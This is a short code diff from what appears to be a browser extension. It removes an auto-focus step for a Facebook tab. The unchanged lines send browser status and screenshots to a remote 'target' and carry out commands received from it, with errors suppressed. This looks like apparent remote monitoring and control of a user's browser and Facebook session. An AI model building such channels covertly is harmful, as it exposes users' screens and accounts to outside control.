@@ -11,10 +11,6 @@ var THGHeartbeat = globalThis.THGHeartbeat || (() => {
     const targets = await THGStream.fetchTargets().catch(() => []);
     let target = THGFacebookState.chooseTarget(targets, state.fbUserId);
     if (target) {
-      if (THGShared.AUTO_FOCUS_FACEBOOK_TAB && (!state.tab || !state.tab.active)) {
-        state = await THGFacebookState.ensureFacebookTabVisible();
-        target = THGFacebookState.chooseTarget(targets, state.fbUserId) || target;
-      }
       await THGStream.sendChromeStatus(target, state).catch(() => {});
       await THGStream.sendScreenshot(target, state).catch(() => {});
       await THGCommands.process(target, state).catch(err => THGShared.storageSet({ lastError: err?.message || String(err) }));
